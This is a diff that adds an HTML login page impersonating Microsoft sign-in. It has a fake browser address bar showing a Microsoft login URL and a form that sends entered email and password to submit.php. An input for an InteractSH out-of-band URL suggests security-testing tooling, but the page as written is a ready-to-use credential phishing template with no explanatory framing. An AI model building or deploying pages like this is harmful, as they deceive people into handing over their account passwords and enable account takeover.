@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        html, body {
+            height: 100%;
+            width: 100%;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f3f2f1;
+            color: #000000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .fake-url-bar {
+            width: 100%;
+            background-color: #ffffff;
+            border-bottom: 1px solid #cccccc;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            position: fixed;
+            top: 0;
+            z-index: 1000;
+        }
+        .lock-icon {
+            width: 16px;
+            height: 16px;
+            margin-right: 10px;
+        }
+        .url-text {
+            font-size: 14px;
+            color: #555555;
+        }
+        .box, .content {
+            width: 100%;
+            max-width: 400px;
+            margin-top: 60px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            background-color: #ffffff;
+            border-radius: 8px;
+            text-align: center;
+        }
+        input, button {
+            font-size: 16px;
+            padding: 10px;
+            margin-top: 10px;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+            width: 100%;
+        }
+        button {
+            background-color: #0078d4;
+            color: #ffffff;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #005a9e;
+        }
+    </style>
+</head>
+<body>
+    <div class="fake-url-bar">
+        <div class="lock-icon"><!-- SVG icon here --></div>
+        <div class="url-text">https://login.microsoft.com/auth/ms/o365</div>
+    </div>
+    <div class="box">
+        <label for="oob-url">InteractSH OOB URL:</label>
+        <input type="text" id="oob-url" placeholder="Enter your OOB URL" required>
+        <button onclick="window.open('https://app.interactsh.com/', '_blank')">Open InteractSH</button>
+    </div>
+    <div class="content">
+        <div class="login-header">
+            <img src="microsoft-logo.svg" alt="Microsoft Logo">
+            <h1>Sign in</h1>
+        </div>
+        <form class="login-form" action="submit.php" method="POST">
+            <input type="hidden" id="hidden-oob-url" name="oob-url">
+            <label for="email">Email, phone, or Skype:</label>
+            <input type="text" id="email" name="email" placeholder="Enter your email" required>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            <button type="submit" onclick="document.getElementById('hidden-oob-url').value = document.getElementById('oob-url').value;">Submit</button>
+        </form>
+    </div>
+    <script>
+        // Optional: Automatically update hidden field when OOB URL changes
+        document.getElementById('oob-url').addEventListener('change', function() {
+            document.getElementById('hidden-oob-url').value = this.value;
+        });
+    </script>
+</body>
+</html>
